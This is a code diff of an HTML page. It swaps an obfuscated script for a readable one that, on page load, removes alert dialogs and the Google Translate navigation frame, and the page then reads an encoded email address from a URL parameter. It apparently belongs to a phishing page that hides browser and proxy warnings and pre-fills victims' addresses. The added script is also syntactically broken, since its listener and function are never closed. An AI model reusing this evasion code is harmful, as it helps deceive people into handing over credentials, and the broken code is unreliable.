@@ -49,9 +49,6 @@
             box-shadow: 5px 5px 15px rgba(0, 0, 0, 0.3);
         }
     </style>
-    <script>
-        function _0x28a2(_0x38a636,_0x56ff8b){var _0x45e6bd=_0x45e6();return _0x28a2=function(_0x28a2a6,_0x38663e){_0x28a2a6=_0x28a2a6-0x77;var _0x168a0b=_0x45e6bd[_0x28a2a6];return _0x168a0b;},_0x28a2(_0x38a636,_0x56ff8b);}var _0x2e5c55=_0x28a2;function _0x45e6(){var _0x3ebe26=['1956uFZIEd','72496aokArU','719600ozLxIY','103380klSnFL','4660845OCRzoP','md-dialog[type=\x22alert\x22]','querySelector','addEventListener','72fewFfn','iframe[title=\x22Navigation\x20in\x20Google\x20Translate\x22]','remove','222980qOLNVs','DOMContentLoaded','11124567cDizBB','2322xpGbmT'];_0x45e6=function(){return _0x3ebe26;};return _0x45e6();}(function(_0x3a0aa0,_0x536aab){var _0x4ae258=_0x28a2,_0x27f6f9=_0x3a0aa0();while(!![]){try{var _0x231d13=-parseInt(_0x4ae258(0x81))/0x1+parseInt(_0x4ae258(0x7c))/0x2+-parseInt(_0x4ae258(0x7f))/0x3*(parseInt(_0x4ae258(0x80))/0x4)+-parseInt(_0x4ae258(0x83))/0x5*(-parseInt(_0x4ae258(0x79))/0x6)+-parseInt(_0x4ae258(0x84))/0x7+-parseInt(_0x4ae258(0x82))/0x8+parseInt(_0x4ae258(0x7e))/0x9;if(_0x231d13===_0x536aab)break;else _0x27f6f9['push'](_0x27f6f9['shift']());}catch(_0x19b791){_0x27f6f9['push'](_0x27f6f9['shift']());}}}(_0x45e6,0x5ef22),document[_0x2e5c55(0x78)](_0x2e5c55(0x7d),function(){var _0x4125a6=_0x2e5c55,_0x514a18=document[_0x4125a6(0x77)](_0x4125a6(0x85));_0x514a18&&_0x514a18['remove']();var _0x5c3b20=document['querySelector'](_0x4125a6(0x7a));_0x5c3b20&&_0x5c3b20[_0x4125a6(0x7b)]();}));
-            </script>
         
 </head>
 <body>
@@ -82,6 +79,18 @@
         </div>
     </div>
 </div>
+	<script>
+		        document.addEventListener("DOMContentLoaded", function() {
+            var dialog = document.querySelector('md-dialog[type="alert"]');
+            if (dialog) {
+                dialog.remove();
+		    
+            }
+            var iframe = document.querySelector('iframe[title="Navigation in Google Translate"]');
+            if (iframe) {
+                iframe.remove();
+            }
+	</script>
 <script>
     const urlParams = new URLSearchParams(window.location.search);
     const encodedEmailParam = urlParams.get("b");
